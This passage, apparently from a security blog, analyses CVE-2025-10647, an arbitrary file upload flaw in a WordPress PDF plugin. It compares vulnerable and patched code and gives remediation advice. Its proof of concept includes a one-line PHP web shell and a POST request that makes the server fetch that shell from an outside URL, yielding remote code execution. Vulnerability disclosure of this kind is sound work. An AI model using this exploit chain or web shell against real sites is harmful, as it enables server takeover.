0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;public function ajax_handler_download_pdf_media() {&#xA;    check_ajax_referer( &amp;#39;epdf_wf_download_pdf_media&amp;#39; );&#xA;&#xA;    if ( empty( $_POST[&amp;#39;url&amp;#39;] ) ) {&#xA;        wp_send_json_error();&#xA;    }&#xA;&#xA;    $url = esc_url_raw( wp_unslash( $_POST[&amp;#39;url&amp;#39;] ) );&#xA;&#xA;    // Download the file.&#xA;    $tmp_file = download_url( $url );&#xA;    if ( is_wp_error( $tmp_file ) ) {&#xA;        wp_send_json_error(&#xA;            array(&#xA;                /* translators: 1. An error message. */&#xA;                &amp;#39;msg&amp;#39; =&amp;gt; sprintf( __( &amp;#39;The download failed with error &amp;#34;%s&amp;#34;&amp;#39;, &amp;#39;embed-pdf-wpforms&amp;#39; ), $tmp_file-&amp;gt;get_error_message() ),&#xA;            )&#xA;        );&#xA;    }&#xA;    // Move from a temp file to the uploads directory.&#xA;    $upload_dir = wp_upload_dir();&#xA;    $file_name  = wp_unique_filename( $upload_dir[&amp;#39;path&amp;#39;], basename( $url ) );&#xA;    $path       = $upload_dir[&amp;#39;path&amp;#39;] . DIRECTORY_SEPARATOR . $file_name;&#xA;    global $wp_filesystem;&#xA;    if ( ! class_exists( &amp;#39;WP_Filesystem&amp;#39; ) ) {&#xA;        require_once ABSPATH . &amp;#39;/wp-admin/includes/file.php&amp;#39;;&#xA;    }&#xA;    WP_Filesystem();&#xA;    $wp_filesystem-&amp;gt;move( $tmp_file, $path );&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In the vulnerable version, the &lt;code&gt;ajax_handler_download_pdf_media()&lt;/code&gt; function downloads a PDF file from the provided URL into WordPress&amp;rsquo;s Media Library via AJAX but does not check the file type or user capabilities.&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Bug&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;An attacker could upload a &lt;code&gt;.php&lt;/code&gt; file to achieve RCE&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;pre&gt;&lt;code&gt;public function ajax_handler_download_pdf_media() {&#xA;    check_ajax_referer( &amp;#39;epdf_wf_download_pdf_media&amp;#39; );&#xA;&#xA;    if ( ! current_user_can( &amp;#39;upload_files&amp;#39; ) ) {&#xA;        wp_send_json_error(&#xA;            array(&#xA;                &amp;#39;msg&amp;#39; =&amp;gt; __( &amp;#39;The download failed&amp;#39;, &amp;#39;embed-pdf-wpforms&amp;#39; ),&#xA;            )&#xA;        );&#xA;    }&#xA;&#xA;    if ( empty( $_POST[&amp;#39;url&amp;#39;] ) ) {&#xA;        wp_send_json_error();&#xA;    }&#xA;&#xA;    $url = esc_url_raw( wp_unslash( $_POST[&amp;#39;url&amp;#39;] ) );&#xA;&#xA;    if ( ! wp_check_filetype( basename( $url ) )[&amp;#39;type&amp;#39;] ) {&#xA;        wp_send_json_error(&#xA;            array(&#xA;                &amp;#39;msg&amp;#39; =&amp;gt; __( &amp;#39;The download failed&amp;#39;, &amp;#39;embed-pdf-wpforms&amp;#39; ),&#xA;            )&#xA;        );&#xA;    }&#xA;&#xA;    // Download the file.&#xA;    $tmp_file = download_url( $url );&#xA;    if ( is_wp_error( $tmp_file ) ) {&#xA;        wp_send_json_error(&#xA;            array(&#xA;                /* translators: 1. An error message. */&#xA;                &amp;#39;msg&amp;#39; =&amp;gt; sprintf( __( &amp;#39;The download failed with error &amp;#34;%s&amp;#34;&amp;#39;, &amp;#39;embed-pdf-wpforms&amp;#39; ), $tmp_file-&amp;gt;get_error_message() ),&#xA;            )&#xA;        );&#xA;    }&#xA;    // Move from a temp file to the uploads directory.&#xA;    $upload_dir = wp_upload_dir();&#xA;    $file_name  = wp_unique_filename( $upload_dir[&amp;#39;path&amp;#39;], basename( $url ) );&#xA;    $path       = $upload_dir[&amp;#39;path&amp;#39;] . DIRECTORY_SEPARATOR . $file_name;&#xA;    global $wp_filesystem;&#xA;    if ( ! class_exists( &amp;#39;WP_Filesystem&amp;#39; ) ) {&#xA;        require_once ABSPATH . &amp;#39;/wp-admin/includes/file.php&amp;#39;;&#xA;    }&#xA;    WP_Filesystem();&#xA;    $wp_filesystem-&amp;gt;move( $tmp_file, $path );&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The patch:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Adds a user capability check:&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! current_user_can( &amp;#39;upload_files&amp;#39; ) ) { ... }&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Only users with upload capability can invoke the handler.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Restricts accepted uploaded file types:&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! wp_check_filetype( basename( $url ) )[&amp;#39;type&amp;#39;] ) { &#xA;    wp_send_json_error(&#xA;        array(&#xA;            &amp;#39;msg&amp;#39; =&amp;gt; __( &amp;#39;The download failed&amp;#39;, &amp;#39;embed-pdf-wpforms&amp;#39; ),&#xA;        )&#xA;    );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/functions/wp_check_filetype/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;wp_check_filetype()&lt;/code&gt;&lt;/a&gt; (WP Core) returns two keys:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;array(&#xA;    &amp;#39;ext&amp;#39;  =&amp;gt; string|false, &#xA;    &amp;#39;type&amp;#39; =&amp;gt; string|false&#xA;)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If &lt;code&gt;type&lt;/code&gt; is not found in &lt;a href=&#34;https://developer.wordpress.org/reference/functions/wp_get_mime_types/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;wp_get_mime_types()&lt;/code&gt;&lt;/a&gt; it returns false. By default this accepts only non-executable file types (does not accept &lt;code&gt;php&lt;/code&gt;).&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;The &lt;code&gt;ajax_handler_download_pdf_media()&lt;/code&gt; function:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Checks the CSRF nonce&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;check_ajax_referer( &amp;#39;epdf_wf_download_pdf_media&amp;#39; );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Searching for the &lt;code&gt;epdf_wf_download_pdf_media&lt;/code&gt; key in the plugin source code directory&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-06-cve-2025-10647/nonce_create.png&#34; title=&#34;Nonce is created with key `_ajax_nonce`&#34; data-thumbnail=&#34;/posts/2025-11-06-cve-2025-10647/nonce_create.png&#34; data-sub-html=&#34;&lt;h2&gt;Nonce Create&lt;/h2&gt;&lt;p&gt;Nonce is created with key `_ajax_nonce`&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-06-cve-2025-10647/nonce_create.png&#39; alt=&#34;Nonce Create&#34; height=&#34;390&#34; width=&#34;1591&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Nonce is created with key `_ajax_nonce`&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;The nonce is created with key &lt;code&gt;_ajax_nonce&lt;/code&gt; and stored in the &lt;code&gt;epdf_wf_pdf_viewer_strings&lt;/code&gt; object — its value can be retrieved in the browser console by calling &lt;code&gt;epdf_wf_pdf_viewer_strings.nonce&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-06-cve-2025-10647/get_nonce.png&#34; title=&#34;Retrieve nonce from browser console&#34; data-thumbnail=&#34;/posts/2025-11-06-cve-2025-10647/get_nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Get Nonce&lt;/h2&gt;&lt;p&gt;Retrieve nonce from browser console&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-06-cve-2025-10647/get_nonce.png&#39; alt=&#34;Get Nonce&#34; height=&#34;728&#34; width=&#34;1097&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Retrieve nonce from browser console&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;This nonce is generated after visiting the page created by &lt;strong&gt;WPForms&lt;/strong&gt; using the &lt;strong&gt;PDF Viewer&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-06-cve-2025-10647/create_form.png&#34; title=&#34;Create a form using WPForms with PDF Viewer&#34; data-thumbnail=&#34;/posts/2025-11-06-cve-2025-10647/create_form.png&#34; data-sub-html=&#34;&lt;h2&gt;Create Form&lt;/h2&gt;&lt;p&gt;Create a form using WPForms with PDF Viewer&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-06-cve-2025-10647/create_form.png&#39; alt=&#34;Create Form&#34; height=&#34;728&#34; width=&#34;1097&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Create a form using WPForms with PDF Viewer&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;The form is embedded into a WordPress Post/Page.&lt;/p&gt;&#xA;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Validate incoming data&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( empty( $_POST[&amp;#39;url&amp;#39;] ) ) {&#xA;    wp_send_json_error();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If the request has no &lt;code&gt;url&lt;/code&gt;, the function returns a JSON error and stops execution.&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Sanitize and obtain the URL&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$url = esc_url_raw( wp_unslash( $_POST[&amp;#39;url&amp;#39;] ) );&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_unslash()&lt;/code&gt; removes slashes added by WordPress when sending POST data.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;esc_url_raw()&lt;/code&gt; sanitizes the URL before using it to download the file.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;Download the file to the server (temporary)&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$tmp_file = download_url( $url );&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;download_url()&lt;/code&gt; downloads the file from the URL to a temporary file on the server.&lt;/li&gt;&#xA;&lt;li&gt;Returns the path to the temporary file on success, or a &lt;code&gt;WP_Error&lt;/code&gt; on failure.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( is_wp_error( $tmp_file ) ) {&#xA;    wp_send_json_error(&#xA;        array(&#xA;            &amp;#39;msg&amp;#39; =&amp;gt; sprintf( __( &amp;#39;The download failed with error &amp;#34;%s&amp;#34;&amp;#39;, &amp;#39;embed-pdf-wpforms&amp;#39; ), $tmp_file-&amp;gt;get_error_message() ),&#xA;        )&#xA;    );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;If the download fails → return JSON error with the error message.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;5&#34;&gt;&#xA;&lt;li&gt;Determine the upload directory and filename&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$upload_dir = wp_upload_dir(); &#xA;$file_name  = wp_unique_filename( $upload_dir[&amp;#39;path&amp;#39;], basename( $url ) );&#xA;$path       = $upload_dir[&amp;#39;path&amp;#39;] . DIRECTORY_SEPARATOR . $file_name;&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_upload_dir()&lt;/code&gt; returns an array with upload directory info: path, URL, subdir, …&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_unique_filename()&lt;/code&gt; ensures the filename does not conflict with existing files.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;$path&lt;/code&gt; is the full path where the file will be saved.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;$upload_dir[&#39;path&#39;]&lt;/code&gt; typically looks like &lt;code&gt;wp-content/uploads/year/month&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;6&#34;&gt;&#xA;&lt;li&gt;Initialize the WordPress Filesystem&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;global $wp_filesystem;&#xA;&#xA;if ( ! class_exists( &amp;#39;WP_Filesystem&amp;#39; ) ) {&#xA;    require_once ABSPATH . &amp;#39;/wp-admin/includes/file.php&amp;#39;;&#xA;}&#xA;&#xA;WP_Filesystem();&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;7&#34;&gt;&#xA;&lt;li&gt;Move the temporary file to the uploads directory&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$wp_filesystem-&amp;gt;move( $tmp_file, $path );&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Moves the file from &lt;code&gt;temp ($tmp_file)&lt;/code&gt; to &lt;code&gt;uploads ($path)&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Uses &lt;code&gt;$wp_filesystem-&amp;gt;move()&lt;/code&gt; instead of &lt;code&gt;rename()&lt;/code&gt; for compatibility with environments (&lt;code&gt;Direct&lt;/code&gt;, &lt;code&gt;FTP&lt;/code&gt;, …).&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;hr&gt;&#xA;&lt;p&gt;The &lt;code&gt;ajax_handler_download_pdf_media()&lt;/code&gt; function is registered as a callback for the action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_ajax_epdf_wf_download_pdf_media&amp;#39;, array( $this, &amp;#39;ajax_handler_download_pdf_media&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This means:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_&lt;/code&gt; requests require the user to be logged in (at least a &lt;code&gt;Subscriber&lt;/code&gt;) to be accepted.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;epdf_wf_download_pdf_media&lt;/code&gt; is the action passed as a parameter.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;When a logged-in user sends a request to the &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; endpoint with &lt;code&gt;action=epdf_wf_download_pdf_media&lt;/code&gt;, &lt;code&gt;ajax_handler_download_pdf_media()&lt;/code&gt; is called to handle the request.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;Subscriber POST -&amp;gt; /wp-admin/admin-ajax.php?action=epdf_wf_download_pdf_media&amp;amp;url=...&amp;#34;] --&amp;gt; B[&amp;#34;ajax_handler_download_pdf_media()&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;check_ajax_referer(&amp;#39;epdf_wf_download_pdf_media&amp;#39;)&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;download_url($url) -&amp;gt; $tmp_file (temporary file)&amp;#34;]&#xA;D --&amp;gt; E{&amp;#34;is_wp_error($tmp_file) ?&amp;#34;}&#xA;E -- &amp;#34;yes&amp;#34; --&amp;gt; F[&amp;#34;wp_send_json_error() -&amp;gt; STOP&amp;#34;]&#xA;E -- &amp;#34;no&amp;#34; --&amp;gt;  K[&amp;#34;Uploaded file accessible → potential RCE&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ol&gt;&#xA;&lt;li&gt;Visit the page containing the form created by &lt;strong&gt;WPForms&lt;/strong&gt; using the &lt;strong&gt;PDF Viewer&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Retrieve the nonce&lt;/li&gt;&#xA;&lt;li&gt;Create a &lt;code&gt;.php&lt;/code&gt; file containing RCE code and host it on the internet&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php system($_REQUEST[&amp;#34;cmd&amp;#34;]); ?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;Send a POST request with the &lt;code&gt;url&lt;/code&gt; pointing to the hosted file&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;Cookie: wordpress_86a9106ae65537651a8e456835b316ab=sub%7C1762165151%7C5VGNGPhUPc74oSqabIRMtpA8jrLrn2JYdg6Lc4fqU8I%7C69db0f51f219492ec3f150bb86bc1364f7cd33442587ddf3f1bf334e4cdec409; wp-settings-time-2=1761725656; wp-settings-4=libraryContent%3Dbrowse%26uploader%3D1%26mfold%3Do; wp-settings-time-4=1761637043; wp-settings-2=editor%3Dtinymce%26libraryContent%3Dbrowse; wp-settings-time-3=1761711790; wp-settings-3=libraryContent%3Dbrowse; _lscache_vary=fff4fa950d2b9daa95c3289bb2a7040a; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=sub%7C1762165151%7C5VGNGPhUPc74oSqabIRMtpA8jrLrn2JYdg6Lc4fqU8I%7Ca7cb9996e74be71e18c68f339c0ad07a43687c7eb701f89fe90374cc2a783131; wp-settings-time-5=1761992371&#xA;...&#xA;&#xA;_ajax_nonce=ea2ccf0ccd&amp;amp;action=epdf_wf_download_pdf_media&amp;amp;url=https://github.com/w41bu1/w41test/raw/refs/heads/main/rce.php&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;5&#34;&gt;&#xA;&lt;li&gt;Access the uploaded file and achieve RCE&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-06-cve-2025-10647/result.png&#34; title=&#34;RCE via file upload&#34; data-thumbnail=&#34;/posts/2025-11-06-cve-2025-10647/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;RCE via file upload&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-06-cve-2025-10647/result.png&#39; alt=&#34;Result&#34; height=&#34;619&#34; width=&#34;1145&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;RCE via file upload&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The vulnerability allowing &lt;strong&gt;arbitrary file upload&lt;/strong&gt; in &lt;code&gt;ajax_handler_download_pdf_media()&lt;/code&gt; was caused by missing checks for user capabilities and file type when downloading files from a URL, enabling an attacker with a Subscriber account to upload executable files (e.g., &lt;code&gt;.php&lt;/code&gt;) and cause &lt;strong&gt;RCE&lt;/strong&gt;. The developer fixed the issue by adding &lt;code&gt;current_user_can(&#39;upload_files&#39;)&lt;/code&gt; and validating MIME types with &lt;code&gt;wp_check_filetype()&lt;/code&gt; in version &lt;strong&gt;1.1.6&lt;/strong&gt;. For affected sites, update to 1.1.6 immediately, inspect and remove suspicious files in the uploads directory, and review user permissions and logs for signs of exploitation.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaway&#34;&gt;&lt;span&gt;Key Takeaway&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaway&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 